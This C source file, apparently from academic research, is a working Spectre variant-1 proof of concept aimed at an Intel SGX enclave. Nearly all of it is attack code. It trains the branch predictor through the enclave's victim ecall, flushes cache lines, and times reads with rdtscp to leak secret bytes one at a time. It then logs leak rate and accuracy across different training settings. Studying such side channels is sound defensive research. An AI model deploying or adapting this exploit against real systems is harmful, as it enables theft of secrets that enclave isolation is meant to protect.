/*
 * Copyright 2018 Imperial College London
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at   
 * 
 *      http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#include "enclave_u.h"
#include "enclave_init.h"
#define IN_JOB //For measure.c using
#include "measure.c"

extern sgx_enclave_id_t global_eid;

unsigned int array1_size = 16;
struct timespec measure_time1, measure_time2;
FILE * log_file;
char * file_name = "measure.log";
//char *secret = "At a seminar in the Bell Communications Research Colloquia Series, Dr. Richard W. Hamming, a Professor at the Naval Postgraduate School in Monterey, California and a retired Bell Labs scientist, gave a very interesting and stimulating talk, `You and Your Research' to an overflow audience of some 200 Bellcore staff members and visitors at the Morris Research and Engineering Center on March 7, 1986. This talk centered on Hamming's observations and research on the question ``Why do so few scientists make significant contributions and so many are forgotten in the long run?'' From his more than forty years of experience, thirty of which were at Bell Laboratories, he has made a number of direct observations, asked very pointed questions of scientists about what, how, and why they did things, studied the lives of great scientists and great contributions, and has done introspection and studied theories of creativity. The talk is about what he has learned in terms of the properties of the individual scientists, their abilities, traits, working habits, attitudes, and philosophy. "; //1086
char *secret = "Hey there";
int correct = 0;
long long total_time = 0;

int cache_hit_threshold = 80;
int try_times = 5;
int train_rounds = 5;
int train_per_round = 6;
int secret_len = 40;
int block_size = 1;

uint8_t unused1[64];
uint8_t unused3[64];
uint8_t array1dupe[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];

/********************************************************************
 Analysis code
********************************************************************/

 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i; 
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    
    for (i = 0; i < 256; i++)
        results[i] = 0;

    for (tries = 0; tries < try_times; tries++) {
        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
        _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 0 ; j < train_rounds * train_per_round; j++) {
            _mm_clflush(&array1_size);
            volatile int z;
            for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */
            
            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % train_per_round) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));
            
            /* Call the victim! */ 
                  sgx_status_t ret = SGX_ERROR_UNEXPECTED;
            ret = ecall_victim_function(global_eid, x, array2, &array1_size);
                if (ret != SGX_SUCCESS)
                    abort();
        }
        
        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk); /* READ TIMER */
            junk = *addr; /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            //if (time2 <= cache_hit_threshold)
            //==// mix_i != array1dupe[tries % array1_size]去掉非投机执行的训练行为
            if (time2 <= cache_hit_threshold && mix_i != array1dupe[tries % array1_size])
            {
                results[mix_i]++; /* cache hit - add +1 to score for this value */
            }
        }
        
        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }

        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
        }

    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
 }


int spectre_main(int argc, char **argv) {
    size_t malicious_x; 
    sgx_status_t ret  = ecall_get_offset(global_eid, &malicious_x); /* default for malicious_x */
    if (ret != SGX_SUCCESS)
            abort();

    
    int i, score[2], len;
    uint8_t value[2];
    
    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    
    // printf("Reading %d bytes:\n", len);
    
    for(len = 0; len < secret_len; len++){
        clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &measure_time1);
        readMemoryByte(malicious_x++, value, score);
        clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &measure_time2);
        total_time += nano_timeval(measure_time1,measure_time2);
        malicious_x += block_size;

        ///////////////////////////////////
        printf("Reading at malicious_x = %p... ", (void*)malicious_x);
        printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");
        //////////////////////////////////
        if (value[0] == *(secret+len)) {
            correct ++;
        }
    }

    //measurements
    fprintf(log_file,"%d ",train_per_round);//
    fprintf(log_file,"time %.2f ",((float)total_time/NANO));
    fprintf(log_file,"rate %.2f ",(float)secret_len / ((float)total_time/NANO) );
    fprintf(log_file,"accuracy %.2f\n",(float)correct/(float)secret_len);
    fflush(log_file);

    return (0);
 }

/* Application entry */
int main(int argc, char *argv[])
{
    int i;
    log_file = fopen(file_name, "wb");
    if (log_file == 0)
    {
        printf("openfailed\n");
        exit(1);
    }
    
    /* Initialize the enclave */
    initialize_enclave();
    //default

    cache_hit_threshold = 80;
    try_times = 16;
    train_rounds = 5;
    train_per_round = 6;
    secret_len = 9;
    block_size = 1;

    for(i = 1; i < 200; i++) 
    {
        //reset
        correct = 0;
        total_time = 0;

        //variable
        train_per_round = i + 1;
        /* Call the main attack function*/
        spectre_main(argc, argv); 
    }
 

    /* Destroy the enclave */
    destroy_enclave();
    fclose(log_file);

    return 0;
}
